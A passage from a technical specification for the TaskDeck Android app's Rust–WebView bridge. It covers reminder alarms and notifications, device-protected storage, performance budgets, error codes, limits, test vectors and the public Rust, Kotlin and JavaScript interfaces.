`call("reminders", {"from_ms": f, "until_ms": u})` returns, for each `Reminder` of `Published::reminders(f, u)` in its order, the core's record (`core.md` §14.5: `at`, `fire_at`, `item`, `key`, `kind`, `minutes`, `name`, `sid`) as a JSON object, plus:

| Member | Type | Value |
|---|---|---|
| `at_ms`, `fire_ms` | integer | `at` and `fire_at` in milliseconds |
| `done` | string | `block` and `due`: `{"op":"complete","id":<item>}` (no `at`: the compile step uses its clock, `core.md` §13.4); absent for `event` |
| `tomorrow` | string | `block`: `{"op":"move_block","id":<item>,"session":<sid>,"day":"<D(at)+1>","start":<L(at)>,"minutes":<minutes>}`; `due`: `{"op":"set_deadline","id":<item>,"deadline":"<D(at)+1>T<hh>:<mm>"}` with `hh:mm` of `L(at)`; absent for `event` (`core.md` §14.5) |

`D` and `L` are the local day and minutes in the device's zone (`Published::zone()`, `core.md` §5.3), computed in `taskdeck-android`, so the shell computes no time itself.

### 15.3 Scheduling

**Reschedule**, at time `now`:

1. When the user is locked: schedule from the DP store's `upcoming` (§15.6) and stop.
2. `R = reminders(now − 3,600,000, now + 172,800,000)`.
3. Drop from the DP store's `notified` every entry with `fire_ms < now − 86,400,000`.
4. Candidates: every record of `R` whose `key` is not notified, and every DP snooze.
5. No candidate: cancel the alarm, set `next_alarm_ms` to `null`, write `upcoming = []`, stop.
6. `T` = the least `max(fire_ms, now)` over the candidates (a reminder missed by less than an hour fires at once).
7. `AlarmManager.setExactAndAllowWhileIdle(RTC_WAKEUP, T, pi)`, where `pi` is an explicit, immutable `PendingIntent` to `AlarmReceiver` with request code 0 and `FLAG_UPDATE_CURRENT` (one alarm at a time: each call replaces the last); on API 31 and later when `canScheduleExactAlarms()` is false, `setAndAllowWhileIdle` instead (the Health screen shows it).
8. Write the DP store: `next_alarm_ms = T`; `upcoming` = the distinct `fire_ms` of the candidates at or after `now`, ascending, at most 512.

**When**: after every `ensureOpen` that opened the core; when the watcher sees `Changes.view` move (debounced: at most one reschedule per 5,000 ms, run at the end of the quiet period); at the end of every job run and every firing; after every action (§15.5); in `SystemReceiver` on `LOCKED_BOOT_COMPLETED` (from `upcoming`), `BOOT_COMPLETED`, `MY_PACKAGE_REPLACED`, `TIME_SET`, `TIMEZONE_CHANGED` (after `set_zone`) and `SCHEDULE_EXACT_ALARM_PERMISSION_STATE_CHANGED`.

- **BRIDGE-REM-001** (android) The app MUST keep at most one reminder alarm set, at the time `T` the eight steps of §15.3 give, and MUST reschedule on every event §15.3 lists.

### 15.4 A firing

`AlarmReceiver.onReceive` calls `goAsync()` and hands the work to a worker thread; at `t` = the current time:

1. When the user is locked: the locked path of §15.6.
2. `ensureOpen`; in synced mode `background_sync(5,000)` (the verify step: a sync of at most 5 s, SYNC.md §4.9).
3. `R' = reminders(t − 3,600,000, t + 540,000)`.
4. Due: every record of `R'` with `fire_ms < t + 540,000` whose key is not notified, and every DP snooze with `fire_ms < t + 540,000` whose key is a record of `R'` (a snooze of a reminder that is gone, because the item was finished or moved elsewhere, posts nothing).
5. Post the due reminders in ascending `(fire_ms, key)`: at most 9 notifications, then, when more remain, one more with the tag `more`, the title `TaskDeck` and the text `<n> more reminders` (no names).
6. Add the posted keys to `notified`; remove the fired snoozes.
7. Reschedule (§15.3) with `now = t`.
8. `finish()` the pending result no later than 9,000 ms after `onReceive`; step 2's sync is skipped when less than 6,000 ms remain.

Nothing is posted for a reminder that the recomputation in step 3 no longer lists: that is "verify before notify" (V2, R2 §5).

- **BRIDGE-REM-002** (android) A firing MUST post only reminders that the recomputation of §15.4 step 3 lists, and MUST post each key at most once.

### 15.5 Notifications and actions

Channels, created in `TaskDeckApp.onCreate`: `reminders` ("Reminders", `IMPORTANCE_HIGH`), `due` ("Due", `IMPORTANCE_HIGH`), `sync` ("Sync problems", `IMPORTANCE_LOW`).

A reminder's notification: tag = its `key`, id 1; channel `reminders` for `event` and `block`, `due` for `due`; title = its `name`; text, with times as `HH:mm` (`DateTimeFormatter.ofPattern("HH:mm")` in the system zone): `event` `Starts <at>` (and `–<at + minutes>` when `minutes` is present), `block` `Block <at>–<at + minutes>`, `due` `Due <at>`; `setWhen(at_ms)`; `setCategory(CATEGORY_REMINDER)`; `setVisibility(VISIBILITY_PRIVATE)` with a public version whose title is `TaskDeck` and text `A reminder is due` (SYNC.md §5.6); `setAutoCancel(true)`; the content intent opens `MainActivity`.

**Actions**, on API 31 and later only (below it a tap opens the app, SYNC_PLAN.md §6.10 item 6): `block` and `due` get Done, Tomorrow and Snooze; `event` gets Snooze. Done and Tomorrow are built with `Notification.Action.Builder.setAuthenticationRequired(true)` (V1-19: nobody holding a locked phone can change the board from the lock screen); Snooze changes nothing on the board and needs none. Each action's intent is explicit and immutable, to `ActionReceiver`, with the extras `key`, `action` (`done`, `tomorrow`, `snooze`) and, for the first two, `intent` (the record's `done` or `tomorrow` string).

`ActionReceiver.onReceive` (`goAsync`), in order:

1. Append `{key, action, intent, at_ms}` to the DP store's `actions` and write it (V2-14: an action taken before the first unlock is not lost).
2. Cancel the notification (tag `key`).
3. When the user is unlocked: process the queue (below); then reschedule.

**Processing the queue**, in order, also after every `ensureOpen` that opened the core: a `snooze` adds `{key, fire_ms: now + 600,000}` to `snoozes`; a `done` or `tomorrow` calls `call("submit_intent", {"intent": …})`, and is removed from the queue when the call succeeds or fails with a `core/` or `engine/` code (on a failure the app posts, on channel `sync` with tag `action-<key>`, `TaskDeck could not do that: <message>`), and kept when it fails with `bridge/not_open` or `device/closed`. Then the DP store is written.

- **BRIDGE-REM-003** (android) Every state-changing notification action MUST carry `setAuthenticationRequired(true)`, and the app MUST NOT add any action to a notification below API 31.
- **BRIDGE-REM-004** (android) Every reminder notification MUST use `VISIBILITY_PRIVATE` with a public version that holds no item name.
- **BRIDGE-REM-005** (android) An action MUST be written to the DP store before anything else is done with it, and MUST be submitted at most once.

### 15.6 The device-protected store

`reminders.json` in `Context.createDeviceProtectedStorageContext().filesDir`, written by replacing (a temporary file, `FileOutputStream.fd.sync()`, rename), at most 1,048,576 bytes:

| Field | Type | Meaning |
|---|---|---|
| `v` | integer | `1` |
| `next_alarm_ms` | integer or `null` | the alarm set now |
| `upcoming` | array of integers, ascending, at most 512 | the fire times of the next 48 hours, for firings before the first unlock |
| `notified` | array of `{"key": string, "fire_ms": integer}`, at most 4,096 | §15.1 |
| `snoozes` | array of `{"key": string, "fire_ms": integer}`, at most 256 | snoozed reminders |
| `actions` | array of `{"key": string, "action": string, "intent": string or absent, "at_ms": integer}`, at most 256 | actions not yet submitted |
| `locked_until_ms` | integer or `null` | the end of the last window the locked path posted for |

It holds reminder keys (a kind, an item id, a sid and an instant), times and intents (ids, a day and minutes); never a name, notes or any other board text (R2 §5: names in device-protected storage would leak them). A parse failure or an oversized file is treated as an empty store.

**The locked path** (an alarm before the first unlock after a reboot): when some `upcoming` time lies in `[max(locked_until_ms, t − 60,000), t + 540,000)`, post one notification on channel `reminders`, tag `locked`, title `TaskDeck`, text `A reminder is due. Unlock the phone to see it.`; set `locked_until_ms = t + 540,000`; set the next alarm at the first `upcoming` time at or after `t + 540,000`. After the unlock, the first `ensureOpen` cancels the tag `locked` and reschedules; reminders missed by less than an hour then fire at once with their names (§15.3 step 6).

- **BRIDGE-REM-006** (android) The DP store MUST hold only the fields of §15.6, and MUST NOT hold any item name or other board text.
- **BRIDGE-REM-007** (android) Before the first unlock, a firing MUST post only the generic notification of §15.6's locked path.

### 15.7 Sync problems

The watcher posts, on channel `sync` with tag `sync`, the notification `TaskDeck sync stopped` / `Open TaskDeck to see why.` when `sync.halted` or `sync.stopped` turns true, or the number of alarms in `status` grows, while `MainActivity` is not started; it cancels the tag when both are false. A job run checks the same after `background_sync`. The text holds no board text.

## 16. Budgets and the timing harness

### 16.1 The budgets

SYNC_PLAN.md §6.6, measured on the API 36 emulator image (`x86_64`) in a dedicated CI job, each as the median of five runs (SYNC_PLAN.md §3.3). `android-shell` measures with `echoTiming`; `android` again with `fullTiming` over a board imported from the 10,000-row archive fixture (SYNC_PLAN.md §6.10). Each baseline goes into the stage's status file; after that a result more than 25% worse than its baseline fails.

| Budget | Limit | One run |
|---|---|---|
| cold start to first painted day | 2,500 ms | §16.2 |
| bridge round trip, 95th percentile | 60 ms | §16.3 |
| universal APK | under 25,000,000 bytes | the size in bytes of the unsigned universal APK of `echoTiming` (`android-shell`) or `fullRelease` (`android`) |

The timing variants write exactly one log line per measurement, tag `TDTIMING`, text `<name>=<integer>` (`cold_start_ms=…`, `rtt_p95_ms=…`), which the CI script reads with `adb logcat -d -s TDTIMING`. No other variant logs (BRIDGE-GEN-005).

- **BRIDGE-BUDGET-001** (android-shell) CI MUST measure the three budgets of §16.1 as §16.2 and §16.3 state with `echoTiming`, and MUST fail when a median exceeds its limit.
- **BRIDGE-BUDGET-002** (android) CI MUST measure the three budgets of §16.1 with `fullTiming` and `fullRelease` over the 10,000-row board, and MUST fail when a median exceeds its limit.

### 16.2 Cold start

1. `adb shell am force-stop <id>`; wait 2,000 ms.
2. `adb shell am start -W -n <id>/app.taskdeck.phone.MainActivity`.
3. The shell takes `t0 = Process.getStartUptimeMillis()` (the process's fork); when the page's `mark` `first_day` arrives (S-18: two animation frames after the first rendered day), `t1 = SystemClock.uptimeMillis()`; it logs `cold_start_ms=<t1 − t0>`.

The first launch after install is discarded; the five runs follow it. The board is already open on the device (a cold process, not a first install), so the Keystore unwrap of `L_d` is inside the measurement (V3's note on StrongBox).

### 16.3 Bridge round trip

After `first_day`, the instrumented test runs, with `evaluateJavascript` in the page realm, a script that posts 220 `req` envelopes for `GET /api/state?from=<today>&days=1` on `TaskDeckBridge` one after the other (each after the previous reply), with ids from 2^52 upward, and measures `performance.now()` from each `postMessage` to its `res` (it wraps `onmessage` and passes every other message on to the page's handler). The first 20 are discarded; the 95th percentile of the other 200 is the 190th smallest; it is logged as `rtt_p95_ms`, rounded up to a whole millisecond.

### 16.4 The pinned clock (`echo` only)

`page/clock.js` replaces `window.Date` with a subclass whose `now()` and argument-less constructor give `Date.parse(meta.now) + (performance.now() − t0)`, with `t0` read when the script runs and `meta.now` the fixture's (§6.7, `2026-01-05T12:00:00Z`); every other constructor form is unchanged. With the emulator started with `-timezone UTC`, the page asks for the fixture's days.

## 17. Error catalogue

Codes the bridge and the shell produce. Facade codes (`device/…`, `engine/…`, `core/…`) pass through as §6.5 and §11.4 state.

| Code | Meaning | Raised when | What the caller does |
|---|---|---|---|
| `bridge/envelope` | a message or its fields do not match §5.2 | §5.2 steps 3 and 4; BRIDGE-MSG-012 | the page has a bug: the request fails with 400 |
| `bridge/no_ready` | a request came before the load's `ready` | §5.2 step 6 | the page has a bug |
| `bridge/busy` | more than 64 requests in flight, or a second `POST /api/screen` within 1,000 ms | §5.2 step 7; §6.4.7 | retry later (503, 429) |
| `bridge/too_large` | a reply would exceed 16,777,216 code units | §5.3 | the page shows the message (500) |
| `bridge/no_route` | no row of §6.2 for the method and path | §6.1; §6.6 | the page shows "No such page." (404) |
| `bridge/verb_refused` | an `op` outside the 17 | BRIDGE-VERB-001 | the page shows the message (403) |
| `bridge/not_open` | the core is not open | §6.5; §11.2 | the page shows the panel or the message (503); a native caller waits for `open` |
| `bridge/open_timeout` | another thread's open took over 20,000 ms | §4.3 step 3 | try again |
| `bridge/bad_body` | a route's body does not match its row | §6.4.5; §8.4 | the page has a bug (400) |
| `bridge/bad_args` | a `call` argument does not match its row | BRIDGE-JNI-005 | the shell has a bug |
| `bridge/call_unknown` | an unknown `call` name | BRIDGE-JNI-005 | the shell has a bug |
| `bridge/not_in_echo` | a `call` the echo backend does not answer | §11.4 | test only |
| `bridge/picture_too_large` | a picture over 6,291,456 bytes | §6.4.4; BRIDGE-MSG-011 | the page shows "That request is too large." (400) |
| `bridge/picture_format` | not a JPEG, or no body and no clear | §6.4.4 | the page shows the message (400) |
| `bridge/location_denied` | the location permission was refused | §6.4.5 step 1 | the page shows the message (403) |
| `bridge/location_unavailable` | no provider, or no fix | §6.4.5 step 2 | the page shows the message (503) |
| `bridge/location_timeout` | no fix within 15,000 ms | §6.4.5 step 2 | the page shows the message (504) |
| `bridge/echo_range` | the echo backend has no fixture for a day | §6.7 | test only (400) |
| `bridge/bad_text` | a Java string with an unpaired surrogate | BRIDGE-JNI-003 | the caller has a bug |
| `bridge/zone` | the platform's zone rules break §12.7 step 4 | §12.7 | the previous zone stays; reported on the Health screen |
| `bridge/panic` | a panic was caught at an entry point | §11.6 | the operation did not happen; the app carries on |
| `bridge/webview_old` | the start-up check failed | §9.1 | the update screen |
| `bridge/renderer_gone` | three renderers gone within 60,000 ms | §9.7 | the "stopped working" screen; Try again |

## 18. Limits

| Name | Value | Unit | Enforced by |
|---|---|---|---|
| message from the page | 8,392,704 | UTF-16 code units | BRIDGE-MSG-005 |
| reply or event to the page | 16,777,216 | UTF-16 code units | BRIDGE-MSG-008 |
| `path` | 2,048 | bytes | BRIDGE-MSG-004 |
| `body` | 84,096 | bytes | BRIDGE-MSG-004 |
| `body_b64` | 8,388,608 | characters | BRIDGE-MSG-004 |
| picture upload, decoded | 1 to 6,291,456 | bytes | BRIDGE-MSG-011 |
| `request_key` | 1 to 128 | characters | BRIDGE-MSG-004 |
| requests in flight per page load | 64 | requests | BRIDGE-MSG-004 |
| verb replies held by request key | 1,024 | replies | BRIDGE-VERB-003 |
| page request timeout; `/api/place`; `/api/background` | 15,000; 30,000; 60,000 | ms | BRIDGE-FORK-001 (S-02) |
| panel without `hello` | 500, then 20,000 | ms | BRIDGE-MSG-014 |
| `hello` after the core opens | 50 | ms | BRIDGE-MSG-013 |
| `changed` after the counters move | 50 | ms | BRIDGE-EVT-002 |
| waiting for another thread's open | 20,000 | ms | BRIDGE-PROC-003 |
| `POST /api/screen` spacing | 1,000 | ms | BRIDGE-ROUTE-006 |
| location fix; last known fix age | 15,000; 300,000 | ms | BRIDGE-ROUTE-004 |
| minimum WebView major version | 120 | version | BRIDGE-WV-001 |
| gone renderers before the error screen | 3 in 60,000 | renderers in ms | BRIDGE-WV-007 |
| unresponsive renderer before termination | 10,000 | ms | BRIDGE-WV-006 |
| Trusted Types input | 262,144 | UTF-16 code units | BRIDGE-TT-001 |
| page `store` | 4,194,304 | UTF-16 code units | BRIDGE-FORK-001 (S-04) |
| preference value | 64 | bytes | BRIDGE-PREF-001 |
| `waitForChange` timeout | 1 to 60,000 | ms | BRIDGE-JNI-002 |
| zone window | 400 back, 800 forward | days | BRIDGE-ZONE-001 |
| zone transitions | 256 | transitions | BRIDGE-ZONE-001 |
| periodic job interval | 1,800,000 | ms | BRIDGE-BG-001 |
| periodic and leaving job budgets | 300,000; 120,000 | ms | BRIDGE-BG-001 |
| reminder window (fold) | 540,000 | ms | BRIDGE-REM-001 |
| reminder look-back; look-ahead | 3,600,000; 172,800,000 | ms | BRIDGE-REM-001 |
| notified kept | 86,400,000 | ms | BRIDGE-REM-002 |
| snooze | 600,000 | ms | BRIDGE-REM-005 |
| verify sync at a firing | 5,000 | ms | BRIDGE-REM-002 |
| firing finished after `onReceive` | 9,000 | ms | BRIDGE-REM-002 |
| notifications per firing | 10 (9 and a summary) | notifications | BRIDGE-REM-002 |
| reschedule debounce | 5,000 | ms | BRIDGE-REM-001 |
| DP store; `upcoming`; `notified`; `snoozes`; `actions` | 1,048,576 bytes; 512; 4,096; 256; 256 | bytes; entries | BRIDGE-REM-006 |
| biometric success valid for | 30,000 | ms | BRIDGE-AUTH-001 |
| cold start to first painted day | 2,500 | ms | BRIDGE-BUDGET-001 |
| bridge round trip, 95th percentile | 60 | ms | BRIDGE-BUDGET-001 |
| universal APK | 25,000,000 | bytes (exclusive) | BRIDGE-BUDGET-001 |
| echo fixture days | 201 | days | BRIDGE-ECHO-001 |

## 19. Test vectors

Stage `android-shell` publishes these families under `crates/taskdeck-android/tests/vectors/`, in the format of README §7; the Kotlin unit tests read the same files (Gradle adds the directory as a test resource directory), and the Node tests of the page's two pure functions read theirs. Families marked `android` are added by `android`.

| File | Section | Inputs | Expected |
|---|---|---|---|
| `envelope.json` | §5.2, §5.3 | a message text, the load's state (ready seen, ids in flight) | `dropped`, or a reply's `status` and `code` |
| `routes-echo.json` | §6.2, §6.4, §6.7 | an envelope, the echo state before | the reply's `status` and `body`, the echo state after |
| `allowlist.json` | §6.6 | every refused verb body and route | `status`, `code`, `body` |
| `errors.json` (`android`) | §6.5 | a `DeviceError` (`code`, `status`, `message`) | `status`, `body` |
| `page-verbs.json` | §6.3, §6.7 | a page control and what the test types or drags (against `small` at the pinned clock) | the exact verb JSON text `GET /api/echo` lists |
| `sync-line.json` (`android`) | A-03 | sync data, `now` | the text, with `TZ=UTC` and `LANG=en_GB.UTF-8` |
| `tt-policy.json` | §9.5 | a string | the returned string (`''` or the input) |
| `zone.json` | §12.7 | a zone name, `now` | `initial` and the first eight transitions |
| `reminder-records.json` (`android`) | §15.2 | a fixture board, a zone, a window | the records with `done` and `tomorrow` |
| `reminder-schedule.json` (`android`) | §15.3, §15.4 | the reminders, the DP store, `now` or a firing at `t` | `T`, the posted keys, the DP store after |
| `harness-attempts.json` | §10.2 | the attempt scripts, row by row | nothing at the sink |

Example of a case of `routes-echo.json` (illustrative):

```json
{ "name": "state-defaults",
  "envelope": "{\"v\":1,\"k\":\"req\",\"id\":7,\"method\":\"GET\",\"path\":\"/api/state\"}",
  "echo_before": { "version": 1 },
  "reply": { "status": 200, "body_from": "fixtures/phone/small/days.json#base", "days": ["2026-01-05"] } }
```

## 20. Interfaces

**`device.md`.**
- Provides what `device.md` §24 asks of the bridge: facade writes only from worker threads (BRIDGE-PROC-006, BRIDGE-PROC-007); `wait_for_change` in the watcher (§4.4, §5.4); verbs through `submit_json` with today's reply (BRIDGE-VERB-002); `/api/state` through `answer_snapshot` (§6.4.1); the `look` bytes as `/bg-<id>.jpg` (BRIDGE-ASSET-003); the Keystore wrap and unwrap (§11.5, §12.5); `set_zone` at start and on every zone change (BRIDGE-ZONE-001); `set_foreground` on `onStart` and `onStop` and `notify_resume` on a network change (BRIDGE-BG-003); `background_sync` from the jobs (BRIDGE-BG-001); the platform verifier initialised before `open` and `TrustRoots` per API level (§11.2, §12.6); BIOMETRIC_STRONG before "auth" calls (BRIDGE-AUTH-001, which `device.md` §17.1 names for Android).
- Requires: `Device::set_own_picture(bytes)` and `clear_own_picture()` (`device.md` §14.3, §17.12, DEV-PIC-005; ruling S29) and `set_look_dials`, each returning `Result<Option<String>, DeviceError>`, the id of the look now shown after it is published; `Published::picture()` and the snapshot's `look` are the own picture's while the phone has one.
- Requires: `Device::weather_place()`, and the report's source as the third element of `Published::weather()` (`device.md` §17.12, §25; §6.4.2); `set_weather_place` with `home` clears the own place.
- Requires: a `set_notes` the page sends through `submit_json` becomes the facade's notes draft (`device.md` §17.6, DEV-FACADE-008), so that after a `core/notes_stale` refusal `notes_merge()` offers its text as `mine` until `resolve_notes` or `discard_notes_draft` (A-06).
- Provides: `AndroidKeyStore`, which writes and removes `ld.wrap` itself, outside the store, on the threads `device.md` §12.1 names (`device.md` §12.5, DEV-THREAD-001; BRIDGE-KEY-001, BRIDGE-KEY-004, BRIDGE-KEY-005).
- Requires: `NoticeView` carries `seq`, `index` and `dismissed` (`device.md` §17.5, §25), and `dismiss_notice` takes that `seq` and `index` (§5.4).
- Assumes: `DeviceStatus`, `taskdeck_sync::Status` and the types inside them have public fields named as `engine.md` §30.1 and `device.md` §25 name them (§11.4.1); `Published::zone()` returns the zone of the last `set_zone`; `Platform::Android { api }` gates the "API 30" calls (DEV-FACADE-007).

**`core.md`.**
- Requires: `notes_base` in the snapshot (`core.md` §14.3 change 9), `parse_intent` ignoring unknown fields and taking `base` (`core.md` §12.2, §12.3), the reminder records (`core.md` §14.5), `TableZone::new` (`core.md` §20).
- Assumes: the snapshot JSON's other names and shapes are today's (CORE-SNAP-001), so the page needs no change for them; `session` is opaque to the page.

**`engine.md`.** Requires: `Status` (`engine.md` §30.1) and `PendingMark` (`entry_id`, `provisional_seq`, `op`, `target`, `doomed`, `acknowledged`); the notice and refusal records (via `core.md` §10.7). Provides nothing to the engine.

**`seal.md`, `relay.md`.** The phone screens display the key fingerprints (`seal.md` §6.8), the sync fingerprint (§15.3) and the relay address (`relay.md` §5.4) only through the facade; the device checks codes and addresses (SEAL-CODE-002, RELAY-ADDR-002). Nothing else.

**Stage `foundation` (fixtures, task 5).** Requires: `fixtures/phone/` as §6.7 lists it (`small/meta.json`, `small/days.json` with 201 days, `weather.json`, `look.jpg`), recorded with today's code at the pinned clock `2026-01-05T12:00:00Z` and `TZ=UTC`; and the 10,000-row board in today's format, which `android` imports for its budgets.

**Stage `android`.** Takes over every clause owned by `android`; replaces the echo backend by `DeviceBackend` behind the same routes; makes A-01 to A-09.

**Stage `release`.** Builds only `fullRelease`, and proves it lacks `test-trust` (DEV-TRUST-003) and the `echo` code (the string `taskdeck-echo-backend` that `EchoBackend` passes to `std::hint::black_box`, searched for in each ABI's `libtaskdeck.so` with the positive control of `device.md` §11.2 run on an `echoDebug` build).

## 21. Public API

**Rust, `crates/taskdeck-android`** (`#![deny(unsafe_code)]`, BRIDGE-GEN-001):

```rust
// Cargo features (§11.1, ruling S32): default = ["backend-device"]; the echo flavour builds with
// --no-default-features --features backend-echo.
#[cfg(all(feature = "backend-echo", feature = "backend-device"))] compile_error!("choose one backend");
#[cfg(not(any(feature = "backend-echo", feature = "backend-device")))] compile_error!("choose a backend");

pub mod envelope {
    pub struct Request { pub id: u64, pub method: Method, pub path: String, pub query: Vec<(String, String)>,
                         pub body: Option<String>, pub body_b64: Option<String>,
                         pub request_key: Option<String>, pub clear: bool }
    pub enum Method { Get, Post }
    pub struct Reply { pub status: u16, pub body: Option<serde_json::Value> }
    pub fn parse_request(text: &str) -> Result<Request, Reply>;          // §5.2 steps 3-4; Err is the 400
    pub fn reply_json(reply: &Reply) -> String;                            // §11.2 `request` result
    pub fn decoded_len(body_b64: &str) -> Option<usize>;                   // BRIDGE-MSG-011
}
pub trait Backend: Send + Sync {
    fn request(&self, request: &envelope::Request) -> envelope::Reply;     // the Rust rows of §6.2
    fn call(&self, name: &str, args: &serde_json::Value) -> Result<serde_json::Value, BridgeError>;
    fn call_secret(&self, name: &str, args: &serde_json::Value, code: zeroize::Zeroizing<String>)
        -> Result<serde_json::Value, BridgeError>;
    fn changes(&self) -> serde_json::Value;
    fn wait_for_change(&self, since_any: u64, timeout_ms: u32) -> serde_json::Value;
    fn picture(&self, id: &str) -> Option<std::sync::Arc<Vec<u8>>>;
}
pub struct BridgeError { pub code: &'static str, pub message: Option<String> }
#[cfg(feature = "backend-echo")]   pub struct EchoBackend { /* §6.7 */ }
#[cfg(feature = "backend-echo")]   impl EchoBackend { pub fn from_fixtures() -> Self; }
#[cfg(feature = "backend-device")] pub struct DeviceBackend { /* Device, the request-key cache */ }
#[cfg(feature = "backend-device")] impl DeviceBackend { pub fn open(config: &OpenConfig) -> Result<(Self, serde_json::Value), BridgeError>; }
// impl Backend for EchoBackend (stage android-shell, §6.7) and impl Backend for DeviceBackend (stage android) are
// those stages' to write; the skeleton carries the two structs without them.
#[cfg(feature = "backend-device")] pub struct PageFacade { /* wraps taskdeck_device::Device */ }
#[cfg(feature = "backend-device")] impl PageFacade {
    pub fn answer_snapshot(&self, from: chrono::NaiveDate, days: u32, now_ms: i64) -> serde_json::Value;
    pub fn today(&self, now_ms: i64) -> chrono::NaiveDate;
    pub fn weather(&self) -> Option<serde_json::Value>;
    pub fn weather_place(&self) -> (taskdeck_device::WeatherSource, Option<taskdeck_core::board::Home>);
    pub fn picture_id(&self) -> Option<String>;
    pub fn submit_json(&self, text: &str) -> Result<taskdeck_device::Submitted, taskdeck_device::DeviceError>;
    pub fn set_look_dials(&self, blur: u8, light: u8) -> Result<Option<String>, taskdeck_device::DeviceError>;
    pub fn set_own_picture(&self, bytes: Vec<u8>) -> Result<Option<String>, taskdeck_device::DeviceError>;
    pub fn clear_own_picture(&self) -> Result<Option<String>, taskdeck_device::DeviceError>;
    pub fn dismiss_notice(&self, seq: u64, index: u32) -> Result<(), taskdeck_device::DeviceError>;
    pub fn notes_merge(&self) -> Option<taskdeck_device::NotesMerge>;
    pub fn resolve_notes(&self, text: String) -> Result<taskdeck_device::Submitted, taskdeck_device::DeviceError>;
    pub fn discard_notes_draft(&self) -> Result<(), taskdeck_device::DeviceError>;
    pub fn changes(&self) -> taskdeck_device::Changes;
}
pub struct OpenConfig { pub data_dir: std::path::PathBuf, pub api: u32, pub build_id: String,
                        pub device_name: String, pub trust: Trust, pub zone: ZoneJson }
pub enum Trust { Platform, Bundled }
pub struct ZoneJson { pub initial: i32, pub transitions: Vec<(i64, i32)> }
pub fn parse_open_config(text: &str) -> Result<OpenConfig, BridgeError>;     // §11.3
pub fn parse_zone(value: &serde_json::Value) -> Result<ZoneJson, BridgeError>; // §12.7 step 4
#[cfg(feature = "backend-device")] pub struct AndroidKeyStore { /* JavaVM, KeyVault refs, data_dir */ }
#[cfg(feature = "backend-device")] impl taskdeck_device::KeyStore for AndroidKeyStore {}
#[cfg(feature = "backend-device")] pub mod reminders {                       // §15.2; it names taskdeck_core, which the crate has only with backend-device
    pub fn record_json(r: &taskdeck_core::reminders::Reminder, zone: &dyn taskdeck_core::time::Zone) -> serde_json::Value;
}
mod jni_entry;   // the nine entry points and JNI_OnLoad (§11.2); the only module with `unsafe`
```

**Kotlin, package `app.taskdeck.phone`**:

```kotlin
object Native {
    @JvmStatic external fun initPlatform(context: android.content.Context): String
    @JvmStatic external fun open(config: String): String
    @JvmStatic external fun close(): String
    @JvmStatic external fun request(envelope: String): String
    @JvmStatic external fun call(name: String, args: String): String
    @JvmStatic external fun callSecret(name: String, args: String, secret: ByteArray): String
    @JvmStatic external fun changes(): String
    @JvmStatic external fun waitForChange(sinceAny: Long, timeoutMs: Int): String
    @JvmStatic external fun picture(id: String): String
}
object KeyVault {                                                    // §11.5, §12.5
    @JvmStatic fun wrap(alias: String, ad: ByteArray, key: ByteArray): ByteArray
    @JvmStatic fun unwrap(alias: String, ad: ByteArray, wrap: ByteArray): ByteArray
    @JvmStatic fun delete(alias: String): ByteArray
}
sealed interface CoreState { object Closed : CoreState; object Opening : CoreState; object Locked : CoreState
    object Open : CoreState; data class Failed(val code: String) : CoreState }
object CoreHost {                                                     // §4.3
    fun ensureOpen(context: android.content.Context): CoreState
    fun state(): CoreState
}
class PageBridge(webView: android.webkit.WebView) : androidx.webkit.WebViewCompat.WebMessageListener {
    override fun onPostMessage(view: android.webkit.WebView, message: androidx.webkit.WebMessageCompat,
        sourceOrigin: android.net.Uri, isMainFrame: Boolean, replyProxy: androidx.webkit.JavaScriptReplyProxy)
    fun postEvent(ev: String, data: org.json.JSONObject)              // to the current page load (§5.4)
    fun endLoad()                                                     // §5.6
}
object BridgeRouter { fun route(method: String, path: String): Route? }   // §6.1, §6.2
enum class Route(val method: String, val path: String, val answeredBy: Side, val slow: Boolean) // the rows of §6.2
enum class Side { KOTLIN, RUST }
class PageAssets(context: android.content.Context) : androidx.webkit.WebViewAssetLoader.PathHandler {
    override fun handle(path: String): android.webkit.WebResourceResponse   // never null (§7.1)
}
object WebViewCheck { fun passes(context: android.content.Context): Boolean; const val MIN_MAJOR = 120 }  // §9.1
object WebViewSetup { fun configure(webView: android.webkit.WebView) }    // §9.2 to §9.6
object AdminClient {                                                    // §11.4, §13.2
    fun call(name: String, args: org.json.JSONObject): org.json.JSONObject
    fun authed(activity: android.app.Activity, name: String, args: org.json.JSONObject,
               done: (org.json.JSONObject?) -> Unit)
}
class CodeField(context: android.content.Context, attrs: android.util.AttributeSet?) : android.widget.EditText(context, attrs)
object ZoneBuilder { fun tableZone(rules: java.time.zone.ZoneRules, nowMs: Long): org.json.JSONObject }   // §12.7
object Scheduler {                                                      // §15.3, §15.4, pure
    fun nextAlarm(reminders: List<ReminderRecord>, store: DpStore, nowMs: Long): Long?
    fun due(reminders: List<ReminderRecord>, store: DpStore, tMs: Long): List<ReminderRecord>
}
data class ReminderRecord(val key: String, val kind: String, val item: Long, val sid: Long?, val name: String,
    val atMs: Long, val fireMs: Long, val minutes: Int?, val done: String?, val tomorrow: String?)
data class DpStore(val nextAlarmMs: Long?, val upcoming: List<Long>, val notified: List<Pair<String, Long>>,
    val snoozes: List<Pair<String, Long>>, val actions: List<DpAction>, val lockedUntilMs: Long?)
data class DpAction(val key: String, val action: String, val intent: String?, val atMs: Long)
class MainActivity : android.app.Activity()
class PairActivity : android.app.Activity()
class DevicesActivity : android.app.Activity()
class HealthActivity : android.app.Activity()
class SyncJobService : android.app.job.JobService()
class AlarmReceiver : android.content.BroadcastReceiver()
class ActionReceiver : android.content.BroadcastReceiver()
class SystemReceiver : android.content.BroadcastReceiver()
class TaskDeckApp : android.app.Application()
```

**JavaScript, in the page** (S-02, S-03): `api(path, options)` → `Promise` of the reply body, rejecting with `ApiError { status, message }` as today; `bridge.on(name, fn)`; `bridge.hello` (a `Promise` of the `hello` data); `bridge.mark(name)`; `bridge.nextChange(seen, ms)` → `Promise<{version}>`; `store` (`getItem`, `setItem`, `removeItem`, `key`, `length`); `ttHtml(s)`; `syncText(sync, now)` (`android`).

## 22. Open questions

Non-normative. Each states the default this spec takes.

1. **The phone's own picture.** Ruled S29: the phone keeps a picture of its own, never synced, processed in Rust like the shared one (`device.md` §14.3, file kind 19 `own-picture.tdk`).
2. **Binary bodies as base64** in the JSON envelope (§5.7), not `ArrayBuffer` messages: one message format on every accepted WebView, and strings across JNI. Decided here (SYNC.md is silent). The cost is about a third more bytes for one upload of at most 6 MiB. V3's note that natively answered Open-Meteo responses would need `Access-Control-Allow-Origin` no longer applies: the page asks no other origin (S-09).
